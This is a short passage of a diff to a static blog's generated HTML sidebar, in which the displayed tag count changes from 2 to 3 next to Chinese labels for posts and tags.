                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -684,7 +811,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-count">3</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
